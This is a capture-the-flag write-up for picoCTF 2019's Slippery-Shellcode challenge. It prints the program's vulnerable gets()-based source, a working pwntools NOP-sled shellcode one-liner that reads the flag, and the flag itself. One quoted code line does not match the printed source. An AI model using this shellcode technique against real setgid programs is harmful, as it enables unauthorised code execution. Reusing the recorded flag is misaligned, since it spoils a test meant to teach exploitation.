# PicoCTF19 Slippery-Shellcode

## Challenge

This [program](https://2019shell1.picoctf.com/static/7bc5b2039cc22a0671fe936eb8633ea1/vuln) is a little bit more tricky. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/slippery-shellcode on the shell server. [Source](https://2019shell1.picoctf.com/static/7bc5b2039cc22a0671fe936eb8633ea1/vuln.c).

## Hints

None

## Solution

Let's print the directory

```bash
samson@pico-2019-shell1:/problems/slippery-shellcode$ ls -al
total 732
drwxr-xr-x   2 root       root                   4096 Sep 28 21:52 .
drwxr-x--x 684 root       root                  69632 Oct 10 18:02 ..
-r--r-----   1 hacksports slippery-shellcode_5     36 Sep 28 21:52 flag.txt
-rwxr-sr-x   1 hacksports slippery-shellcode_5 662532 Sep 28 21:52 vuln
-rw-rw-r--   1 hacksports hacksports              692 Sep 28 21:52 vuln.c
samson@pico-2019-shell1:/problems/slippery-shellcode$ cat vuln.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 512
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){
  setvbuf(stdout, NULL, _IONBF, 0);
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  char buf[BUFSIZE];
  puts("Enter your shellcode:");
  vuln(buf);
  puts("Thanks! Executing from a random location now...");
  int offset = (rand() % 256) + 1;
  ((void (*)())(buf+offset))();
  puts("Finishing Executing Shellcode. Exiting now...");
  return 0;
}
```

Look at this line in particular

```
  ((void (*)())buf)();
```
This takes `buf+offset`, casts it to the void function pointer which returns nothing and then runs that function. So it'll execute whatever is at the address for `buf`.

So the solution for this is to create a [NOP Sled](https://en.wikipedia.org/wiki/NOP_slide) to have no executable shellcode at any point in the space between 0 and 255 and execute anything afterwards.
That handles the case where `offset==255`, then we can run our actual command which is printing the flag.

In a nutshell, we are inserting `NOP` operations until we can certain that our code will be run in full no matter what the random offset will be.


```bash
samson@pico-2019-shell1:/problems/slippery-shellcode$ (python -c "import pwn; print(pwn.asm(pwn.shellcraft.nop()*256+pwn.shellcraft.cat('flag.txt',1)))"; cat) | ./vuln
Enter your shellcode:
... <redacted>
Thanks! Executing from a random location now...
picoCTF{sl1pp3ry_sh311c0d3_ecc37b22}
Segmentation fault (core dumped)
```

## Flag

`picoCTF{sl1pp3ry_sh311c0d3_ecc37b22}`